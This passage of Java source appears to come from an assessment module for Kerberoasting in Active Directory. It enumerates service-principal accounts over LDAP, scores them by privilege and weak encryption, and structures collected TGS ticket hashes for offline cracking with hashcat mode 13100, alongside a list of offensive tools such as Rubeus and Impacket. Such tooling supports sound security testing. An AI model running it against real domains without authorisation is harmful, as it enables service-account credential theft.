        out.put("service_types", record.serviceTypes);
        out.put("risk_score", record.riskScore);
        out.put("risk_level", record.riskLevel);
        out.put("privileged", record.privileged);
        out.put("weak_encryption", record.weakEncryption);
        out.put("delegation_enabled", record.trustedForDelegation || record.trustedToAuthForDelegation);
        return out;
    }

    private List<Map<String, Object>> buildOperationalStack() {
        List<Map<String, Object>> stack = new ArrayList<>();
        stack.add(tool("Impacket GetUserSPNs", "SPN enumeration and optional TGS extraction", "https://github.com/fortra/impacket"));
        stack.add(tool("PowerView", "PowerShell-based SPN enumeration on Windows footholds", "https://github.com/PowerShellMafia/PowerSploit"));
        stack.add(tool("Rubeus", "Kerberos abuse workflows including kerberoast operations", "https://github.com/GhostPack/Rubeus"));
        stack.add(tool("LDAP Raw Query", "Direct servicePrincipalName LDAP interrogation", "(&(servicePrincipalName=*))"));
        stack.add(tool("BloodHound", "Privilege path mapping for kerberoastable principals", "https://bloodhound.readthedocs.io/"));
        return stack;
    }

    private Map<String, Object> tool(String name, String purpose, String reference) {
        Map<String, Object> map = new LinkedHashMap<>();
        map.put("name", name);
        map.put("purpose", purpose);
        map.put("reference", reference);
        return map;
    }

    private Map<String, Object> buildNormalizedOutput(
            Map<String, Object> summary,
            List<Map<String, Object>> findings,
            List<TgsTicketRecord> tgsTickets,
            ModuleConfig config) {

        long kerberoastable = ((Number) summary.getOrDefault("kerberoastable_count", 0)).longValue();

        Map<String, Object> rawOutput = new LinkedHashMap<>();
        rawOutput.put("summary", summary);
        rawOutput.put("record_count", findings.size());
        rawOutput.put("tgs_hash_count", tgsTickets.size());

        Map<String, Object> parsedOutput = new LinkedHashMap<>();
        parsedOutput.put("status", kerberoastable > 0
            ? "KERBEROASTABLE_SPN_TARGETS_IDENTIFIED"
            : "SPN_INVENTORY_COMPLETE_NO_ACTIVE_TARGETS");
        parsedOutput.put("vulnerable", kerberoastable > 0);
        parsedOutput.put("details", summary);
        parsedOutput.put("evidence", findings);
        parsedOutput.put("tgs_hashes", tgsTickets.stream().map(TgsTicketRecord::toMap).toList());

        Map<String, Object> metadata = new LinkedHashMap<>();
        metadata.put("module", MODULE_ID);
        metadata.put("mode", config.mode.value);

        Map<String, Object> normalized = new LinkedHashMap<>();
        normalized.put("raw_output", rawOutput);
        normalized.put("parsed_output", parsedOutput);
        normalized.put("metadata", metadata);
        return normalized;
    }

    private String buildLdapFilter(ModuleConfig config) {
        String objectScope;
        if (config.includeComputerAccounts) {
            objectScope = "(|(&(objectCategory=person)(objectClass=user))(objectCategory=computer))";
        } else {
            objectScope = "(&(objectCategory=person)(objectClass=user))";
        }

        StringBuilder filter = new StringBuilder("(&");
        filter.append(objectScope);
        filter.append("(servicePrincipalName=*)");

        if (!config.includeDisabled) {
            filter.append("(!(userAccountControl:1.2.840.113556.1.4.803:=")
                .append(UF_ACCOUNTDISABLE)
                .append("))");
        }

        if (config.mode == ModuleMode.ACCOUNT_CONFIRMATION && !config.focusAccount.isBlank()) {
            String escaped = escapeFilterValue(stripTrailingDollar(config.focusAccount));
            filter.append("(|")
                .append("(sAMAccountName=").append(escaped).append(")")
                .append("(sAMAccountName=").append(escaped).append("$)")
                .append("(userPrincipalName=").append(escaped).append(")")
                .append("(cn=").append(escaped).append(")")
                .append(")");
        }

        filter.append(")");
        return filter.toString();
    }

    private List<String> validateConfig(ModuleConfig config) {
        List<String> errors = new ArrayList<>();

        if (config.target.isBlank()) {
            errors.add("target is required");
        }

        if (config.mode == ModuleMode.ACCOUNT_CONFIRMATION && config.focusAccount.isBlank()) {
            errors.add("focus_account is required when mode=account_confirmation");
        }

        boolean needsCredentials = config.mode == ModuleMode.TGS_COLLECTION || config.requestTgs;
        if (needsCredentials && config.username.isBlank()) {
            errors.add("username is required for TGS collection");
        }

        if (!config.username.isBlank() && !config.useKerberos && config.password.isBlank() && config.hashes.isBlank()) {
            errors.add("password is required when username is provided unless Kerberos or hashes are supplied");
        }

        if (config.ldapPort < 1 || config.ldapPort > 65535) {
            errors.add("ldap_port must be between 1 and 65535");
        }

        if (config.connectTimeoutMs < 500 || config.connectTimeoutMs > 120_000) {
            errors.add("connect_timeout_ms must be between 500 and 120000");
        }

        if (config.readTimeoutMs < 500 || config.readTimeoutMs > 300_000) {
            errors.add("read_timeout_ms must be between 500 and 300000");
        }

        if (config.maxResults < 1 || config.maxResults > MAX_ALLOWED_RESULTS) {
            errors.add("max_results must be between 1 and " + MAX_ALLOWED_RESULTS);
        }

        if (config.commandTimeoutMs < 1_000 || config.commandTimeoutMs > 600_000) {
            errors.add("command_timeout_ms must be between 1000 and 600000");
        }

        if (config.maxTgsHashes < 1 || config.maxTgsHashes > 10_000) {
            errors.add("max_tgs_hashes must be between 1 and 10000");
        }

        return errors;
    }

    private ModuleConfig parseConfig(Map<String, String> input) {
        ModuleConfig config = new ModuleConfig();

        LegacyTargetInput legacy = parseLegacyTargetInput(firstNonBlank(input.get("target"), ""));

        config.mode = ModuleMode.fromInput(firstNonBlank(input.get("mode"), "spn_inventory"));
        config.target = firstNonBlank(legacy.target, input.get("domain"), input.get("dc_ip"));
        config.dcIp = trim(input.get("dc_ip"));
        config.baseDn = trim(input.get("base_dn"));

        config.username = firstNonBlank(input.get("username"), legacy.username);
        config.password = firstNonBlank(input.get("password"), legacy.password);
        config.hashes = trim(input.get("hashes"));
        config.useKerberos = parseBoolean(input.get("use_kerberos"), false);
        config.aesKey = trim(input.get("aes_key"));

        config.useLdaps = parseBoolean(input.get("use_ldaps"), false);
        int defaultPort = config.useLdaps ? DEFAULT_LDAPS_PORT : DEFAULT_LDAP_PORT;
        config.ldapPort = parseInteger(input.get("ldap_port"), defaultPort);

        config.connectTimeoutMs = parseInteger(input.get("connect_timeout_ms"), DEFAULT_CONNECT_TIMEOUT_MS);
        config.readTimeoutMs = parseInteger(input.get("read_timeout_ms"), DEFAULT_READ_TIMEOUT_MS);
        config.maxResults = parseInteger(input.get("max_results"), DEFAULT_MAX_RESULTS);

        config.includeDisabled = parseBoolean(input.get("include_disabled"), false);
        config.includeComputerAccounts = parseBoolean(input.get("include_computer_accounts"), false);
        config.delegationOnly = parseBoolean(input.get("delegation_only"), false);
        config.spnFilter = trim(input.get("spn_filter"));
        config.spnFilterTokens = parseFilterTokens(config.spnFilter);

        config.requestTgs = parseBoolean(input.get("request_tgs"), false);
        if (config.mode == ModuleMode.TGS_COLLECTION) {
            config.requestTgs = true;
        }
        config.useImpacket = parseBoolean(input.get("use_impacket"), true);
        config.commandTimeoutMs = parseInteger(input.get("command_timeout_ms"), DEFAULT_COMMAND_TIMEOUT_MS);
        config.maxTgsHashes = parseInteger(input.get("max_tgs_hashes"), DEFAULT_MAX_TGS_HASHES);

        config.focusAccount = firstNonBlank(input.get("focus_account"), input.get("identify_target"));
        config.focusMatchExact = "exact".equalsIgnoreCase(trim(input.get("trace_match_mode")));

        config.toolIdentityDomain = firstNonBlank(legacy.domain, extractDomainFromTarget(config.target));
        config.toolIdentityUser = firstNonBlank(legacy.username, extractSamFromPrincipal(config.username));

        return config;
    }

    private LegacyTargetInput parseLegacyTargetInput(String rawTarget) {
        LegacyTargetInput parsed = new LegacyTargetInput();
        String target = trim(rawTarget);
        if (target.isBlank()) {
            return parsed;
        }

        Matcher matcher = TARGET_WITH_CREDS_PATTERN.matcher(target);
        if (!matcher.matches()) {
            parsed.target = target;
            return parsed;
        }

        parsed.target = firstNonBlank(matcher.group(1));
        parsed.domain = firstNonBlank(matcher.group(1));
        parsed.username = firstNonBlank(matcher.group(2));
        parsed.password = firstNonBlank(matcher.group(3));
        return parsed;
    }

    private List<String> parseFilterTokens(String value) {
        String raw = trim(value).toLowerCase(Locale.ROOT);
        if (raw.isBlank()) {
            return List.of();
        }

        List<String> tokens = new ArrayList<>();
        for (String token : raw.split("[|,;\\s]+")) {
            String trimmed = token.trim();
            if (!trimmed.isBlank()) {
                tokens.add(trimmed);
            }
        }
        return tokens;
    }

    private String extractDomainFromTarget(String target) {
        String value = trim(target);
        if (value.contains(".")) {
            return value;
        }
        return value;
    }

    private String extractSamFromPrincipal(String principal) {
        String value = trim(principal);
        if (value.contains("\\")) {
            return value.substring(value.indexOf('\\') + 1);
        }
        if (value.contains("@")) {
            return value.substring(0, value.indexOf('@'));
        }
        return value;
    }

    private String buildLdapUrl(ModuleConfig config) {
        String host = firstNonBlank(config.dcIp, config.target);
        String scheme = config.useLdaps ? "ldaps" : "ldap";
        return scheme + "://" + host + ":" + config.ldapPort;
    }

    private String authModeLabel(ModuleConfig config) {
        if (config.useKerberos) {
            return "kerberos";
        }
        if (!config.username.isBlank()) {
            return "simple_bind";
        }
        return "anonymous";
    }

    private String normalizePrincipal(String username, String target) {
        String value = trim(username);
        if (value.isBlank()) {
            return "";
        }
        if (value.contains("@") || value.contains("\\")) {
            return value;
        }
        if (looksLikeDomainName(target)) {
            return value + "@" + target.toLowerCase(Locale.ROOT);
        }
        return value;
    }

    private String baseDnToDomain(String baseDn) {
        String value = trim(baseDn);
        if (value.isBlank()) {
            return "";
        }
        List<String> parts = new ArrayList<>();
        for (String fragment : value.split(",")) {
            String piece = fragment.trim();
            if (piece.toUpperCase(Locale.ROOT).startsWith("DC=")) {
                parts.add(piece.substring(3));
            }
        }
        return String.join(".", parts);
    }

    private String domainToBaseDn(String domain) {
        List<String> parts = new ArrayList<>();
        for (String token : domain.split("\\.")) {
            String value = token.trim();
            if (!value.isBlank()) {
                parts.add("DC=" + value);
            }
        }
        return String.join(",", parts);
    }

    private boolean looksLikeDomainName(String value) {
        String candidate = trim(value);
        return candidate.contains(".") && !candidate.contains("/") && !candidate.contains("\\") && !candidate.contains(":");
    }

    private String stripTrailingDollar(String value) {
        String candidate = trim(value);
        if (candidate.endsWith("$")) {
            return candidate.substring(0, candidate.length() - 1);
        }
        return candidate;
    }

    private String normalizeFocus(String value) {
        return stripTrailingDollar(value).toLowerCase(Locale.ROOT);
    }

    private String safeNameInNamespace(SearchResult result) {
        try {
            return firstNonBlank(result.getNameInNamespace());
        } catch (Exception ignored) {
            return "";
        }
    }

    private String getStringAttribute(Attributes attrs, String name) throws NamingException {
        Attribute attr = attrs.get(name);
        if (attr == null || attr.size() == 0) {
            return "";
        }
        Object value = attr.get();
        return value == null ? "" : String.valueOf(value).trim();
    }

    private List<String> getListAttribute(Attributes attrs, String name) throws NamingException {
        List<String> values = new ArrayList<>();
        Attribute attr = attrs.get(name);
        if (attr == null || attr.size() == 0) {
            return values;
        }

        NamingEnumeration<?> all = attr.getAll();
        try {
            while (all.hasMore()) {
                Object value = all.next();
                if (value != null) {
                    values.add(String.valueOf(value).trim());
                }
            }
        } finally {
            if (all != null) {
                all.close();
            }
        }
        return values;
    }

    private Set<String> lowerCaseSet(List<String> values) {
        Set<String> set = new LinkedHashSet<>();
        for (String value : values) {
            set.add(value.toLowerCase(Locale.ROOT));
        }
        return set;
    }

    private List<String> extractServiceTypes(List<String> spns) {
        Set<String> types = new LinkedHashSet<>();
        for (String spn : spns) {
            String value = trim(spn);
            int slash = value.indexOf('/');
            if (slash > 0) {
                types.add(value.substring(0, slash).toUpperCase(Locale.ROOT));
            } else if (!value.isBlank()) {
                types.add(value.toUpperCase(Locale.ROOT));
            }
        }
        return new ArrayList<>(types);
    }

    private boolean isPrivileged(SpnRecord record) {
        if (record.adminCount > 0) {
            return true;
        }

        for (String groupDn : record.memberOf) {
            String lowered = groupDn.toLowerCase(Locale.ROOT);
            for (String keyword : PRIVILEGED_GROUP_KEYWORDS) {
                if (lowered.contains(keyword)) {
                    return true;
                }
            }
        }
        return false;
    }

    private boolean hasHighValueService(List<String> serviceTypes) {
        for (String serviceType : serviceTypes) {
            if (HIGH_VALUE_SERVICE_TYPES.contains(serviceType.toUpperCase(Locale.ROOT))) {
                return true;
            }
        }
        return false;
    }

    private List<String> buildRiskTags(SpnRecord record) {
        List<String> tags = new ArrayList<>();
        if (record.kerberoastable) {
            tags.add("kerberoastable");
        }
        if (record.privileged) {
            tags.add("privileged_account");
        }
        if (record.highValueService) {
            tags.add("high_value_service");
        }
        if (record.weakEncryption) {
            tags.add("weak_ticket_encryption");
        }
        if (record.trustedToAuthForDelegation) {
            tags.add("protocol_transition");
        }
        if (record.trustedForDelegation) {
            tags.add("trusted_for_delegation");
        }
        if (record.notDelegated) {
            tags.add("not_delegated_flag");
        }
        if (record.isComputer) {
            tags.add("computer_account");
        }
        return tags;
    }

    private int scoreRecord(SpnRecord record) {
        int score = 40;

        if (record.kerberoastable) {
            score += 10;
        }
        if (record.privileged) {
            score += 30;
        }
        if (record.highValueService) {
            score += 10;
        }
        if (record.weakEncryption) {
            score += 20;
        }
        if (record.trustedToAuthForDelegation) {
            score += 15;
        }
        if (record.trustedForDelegation) {
            score += 10;
        }
        if (record.disabled) {
            score -= 25;
        }
        if (record.notDelegated) {
            score -= 10;
        }
        if (record.isComputer) {
            score -= 15;
        }

        return Math.max(0, Math.min(100, score));
    }

    private String riskLevel(int score) {
        if (score >= 80) {
            return "high";
        }
        if (score >= 60) {
            return "medium";
        }
        if (score >= 35) {
            return "low";
        }
        return "info";
    }

    private boolean isWeakEncryption(int value) {
        if (value == 0) {
            return true;
        }

        boolean hasDes = (value & 0x1) != 0 || (value & 0x2) != 0;
        boolean hasRc4 = (value & 0x4) != 0;
        boolean hasAes = (value & 0x8) != 0 || (value & 0x10) != 0;

        if (hasDes || hasRc4) {
            return true;
        }
        return !hasAes;
    }

    private List<String> decodeEncryptionTypes(int value) {
        List<String> flags = new ArrayList<>();
        if (value == 0) {
            flags.add("UNSPECIFIED_OR_LEGACY_DEFAULT");
            return flags;
        }

        if ((value & 0x1) != 0) {
            flags.add("DES_CBC_CRC");
        }
        if ((value & 0x2) != 0) {
            flags.add("DES_CBC_MD5");
        }
        if ((value & 0x4) != 0) {
            flags.add("RC4_HMAC");
        }
        if ((value & 0x8) != 0) {
            flags.add("AES128_HMAC");
        }
        if ((value & 0x10) != 0) {
            flags.add("AES256_HMAC");
        }
        if ((value & 0x20) != 0) {
            flags.add("FAST_SUPPORTED");
        }
        return flags;
    }

    private boolean hasUacFlag(int value, int flag) {
        return (value & flag) == flag;
    }

    private String fileTimeToIso(long fileTime) {
        if (fileTime <= 0) {
            return "";
        }
        try {
            long secondsSince1601 = fileTime / 10_000_000L;
            long unixSeconds = secondsSince1601 - AD_EPOCH_DIFF_SECONDS;
            if (unixSeconds <= 0) {
                return "";
            }
            return ISO_FMT.format(Instant.ofEpochSecond(unixSeconds).atOffset(ZoneOffset.UTC));
        } catch (Exception e) {
            return "";
        }
    }

    private long computeAgeDays(long fileTime) {
        if (fileTime <= 0) {
            return -1;
        }
        try {
            long secondsSince1601 = fileTime / 10_000_000L;
            long unixSeconds = secondsSince1601 - AD_EPOCH_DIFF_SECONDS;
            if (unixSeconds <= 0) {
                return -1;
            }
            long now = Instant.now().getEpochSecond();
            return Math.max(0, (now - unixSeconds) / 86_400L);
        } catch (Exception e) {
            return -1;
        }
    }

    private String escapeFilterValue(String value) {
        String candidate = firstNonBlank(value);
        return candidate
            .replace("\\", "\\5c")
            .replace("*", "\\2a")
            .replace("(", "\\28")
            .replace(")", "\\29")
            .replace("\u0000", "\\00");
    }

    private String firstAvailableCommand(List<String> commands) {
        for (String command : commands) {
            if (isCommandAvailable(command)) {
                return command;
            }
        }
        return "";
    }

    private int parseInteger(String value, int defaultValue) {
        String raw = trim(value);
        if (raw.isBlank()) {
            return defaultValue;
        }
        try {
            return Integer.parseInt(raw);
        } catch (NumberFormatException ignored) {
            return defaultValue;
        }
    }

    private long parseLong(String value, long defaultValue) {
        String raw = trim(value);
        if (raw.isBlank()) {
            return defaultValue;
        }
        try {
            return Long.parseLong(raw);
        } catch (NumberFormatException ignored) {
            return defaultValue;
        }
    }

    private boolean parseBoolean(String value, boolean defaultValue) {
        String raw = trim(value);
        if (raw.isBlank()) {
            return defaultValue;
        }
        return Boolean.parseBoolean(raw);
    }

    private String trim(String value) {
        return value == null ? "" : value.trim();
    }

    private String firstLine(String value) {
        if (value == null || value.isBlank()) {
            return "";
        }
        String[] lines = value.split("\\R", 2);
        return lines.length == 0 ? "" : lines[0].trim();
    }

    private String firstNonBlank(String... values) {
        for (String value : values) {
            if (value != null && !value.trim().isBlank()) {
                return value.trim();
            }
        }
        return "";
    }

    private void copyStream(java.io.InputStream stream, StringBuilder sink) {
        try (java.io.BufferedReader reader = new java.io.BufferedReader(
                new java.io.InputStreamReader(stream, java.nio.charset.StandardCharsets.UTF_8))) {
            String line;
            while ((line = reader.readLine()) != null) {
                sink.append(line).append('\n');
            }
        } catch (Exception ignored) {
            // Stream capture is best effort.
        }
    }

    private void joinQuietly(Thread thread, long timeoutMs) {
        if (thread == null) {
            return;
        }
        try {
            thread.join(timeoutMs);
        } catch (InterruptedException ignored) {
            Thread.currentThread().interrupt();
        }
    }

    private void closeQuietly(LdapContext ldap) {
        if (ldap != null) {
            try {
                ldap.close();
            } catch (Exception ignored) {
                // no-op
            }
        }
    }

    private boolean isWindows() {
        String os = System.getProperty("os.name", "").toLowerCase(Locale.ROOT);
        return os.contains("win");
    }

    protected enum ModuleMode {
        SPN_INVENTORY("spn_inventory", "spn_inventory_result"),
        KERBEROAST_TARGETING("kerberoast_targeting", "kerberoast_targeting_result"),
        TGS_COLLECTION("tgs_collection", "tgs_collection_result"),
        ACCOUNT_CONFIRMATION("account_confirmation", "account_confirmation_result");

        private final String value;
        private final String resultKey;

        ModuleMode(String value, String resultKey) {
            this.value = value;
            this.resultKey = resultKey;
        }

        private static ModuleMode fromInput(String raw) {
            String normalized = raw == null
                ? ""
                : raw.trim().toLowerCase(Locale.ROOT).replace('-', '_').replace(' ', '_');

            return switch (normalized) {
                case "kerberoast_targeting", "target_classification", "classification" -> KERBEROAST_TARGETING;
                case "tgs_collection", "request_tgs", "ticket_collection" -> TGS_COLLECTION;
                case "account_confirmation", "host_confirmation", "identify" -> ACCOUNT_CONFIRMATION;
                default -> SPN_INVENTORY;
            };
        }
    }

    protected static class ModuleConfig {
        protected ModuleMode mode = ModuleMode.SPN_INVENTORY;

        protected String target = "";
        protected String dcIp = "";
        protected String baseDn = "";

        protected String username = "";
        protected String password = "";
        protected String hashes = "";
        protected boolean useKerberos;
        protected String aesKey = "";

        protected boolean useLdaps;
        protected int ldapPort = DEFAULT_LDAP_PORT;
        protected int connectTimeoutMs = DEFAULT_CONNECT_TIMEOUT_MS;
        protected int readTimeoutMs = DEFAULT_READ_TIMEOUT_MS;
        protected int maxResults = DEFAULT_MAX_RESULTS;

        protected String spnFilter = "";
        protected List<String> spnFilterTokens = List.of();
        protected boolean includeDisabled;
        protected boolean includeComputerAccounts;
        protected boolean delegationOnly;

        protected boolean requestTgs;
        protected boolean useImpacket = true;
        protected int commandTimeoutMs = DEFAULT_COMMAND_TIMEOUT_MS;
        protected int maxTgsHashes = DEFAULT_MAX_TGS_HASHES;

        protected String focusAccount = "";
        protected boolean focusMatchExact;

        protected String toolIdentityDomain = "";
        protected String toolIdentityUser = "";
    }

    protected static class SpnRecord {
        protected String samAccountName = "";
        protected String userPrincipalName = "";
        protected String displayName = "";
        protected String mail = "";
        protected String distinguishedName = "";

        protected List<String> servicePrincipalNames = new ArrayList<>();
        protected List<String> serviceTypes = new ArrayList<>();
        protected Set<String> objectClasses = new LinkedHashSet<>();

        protected int userAccountControl;
        protected int adminCount;
        protected List<String> memberOf = new ArrayList<>();

        protected long pwdLastSetRaw;
        protected long lastLogonTimestampRaw;
        protected String passwordLastSet = "";
        protected long passwordAgeDays = -1;
        protected String lastLogonTimestamp = "";
        protected long lastLogonAgeDays = -1;

        protected int supportedEncryptionTypes;
        protected List<String> encryptionFlags = new ArrayList<>();
        protected boolean weakEncryption;

        protected boolean disabled;
        protected boolean notDelegated;
        protected boolean trustedForDelegation;
        protected boolean trustedToAuthForDelegation;
        protected boolean isComputer;
        protected boolean privileged;
        protected boolean kerberoastable;
        protected boolean highValueService;

        protected List<String> riskTags = new ArrayList<>();
        protected int riskScore;
        protected String riskLevel = "info";
    }

    protected static class TgsTicketRecord {
        protected String accountName = "";
        protected String realm = "";
        protected String servicePrincipalName = "";
        protected String encryptionType = "";
        protected String hashType = "krb5tgs";
        protected String hashcatMode = "13100";
        protected String hash = "";

        protected Map<String, Object> toMap() {
            Map<String, Object> map = new LinkedHashMap<>();
            map.put("account_name", accountName);
            map.put("realm", realm);
            map.put("service_principal_name", servicePrincipalName);
            map.put("encryption_type", encryptionType);
            map.put("hash_type", hashType);
            map.put("hashcat_mode", hashcatMode);
            map.put("hash", hash);
            return map;
        }
    }

    protected static class CommandExecutionResult {
        protected final int exitCode;
        protected final String stdout;
        protected final String stderr;
        protected final boolean timedOut;
        protected final long durationMs;

        protected CommandExecutionResult(int exitCode, String stdout, String stderr, boolean timedOut, long durationMs) {
            this.exitCode = exitCode;
            this.stdout = stdout == null ? "" : stdout;
            this.stderr = stderr == null ? "" : stderr;
            this.timedOut = timedOut;
            this.durationMs = durationMs;
        }

        protected String combinedOutput() {
            if (stderr.isBlank()) {
                return stdout;
            }
            if (stdout.isBlank()) {
                return stderr;
            }
            return stdout + "\n" + stderr;
        }
    }

    protected static class ExecutionDiagnostics {
        protected final List<String> toolUsage = new ArrayList<>();
        protected final List<String> executedCommands = new ArrayList<>();
        protected final List<Map<String, Object>> commandLog = new ArrayList<>();
        protected final List<String> warnings = new ArrayList<>();
        protected int commandExecutions;
    }

    private static class LegacyTargetInput {
        private String target = "";
        private String domain = "";
        private String username = "";
        private String password = "";
    }
}
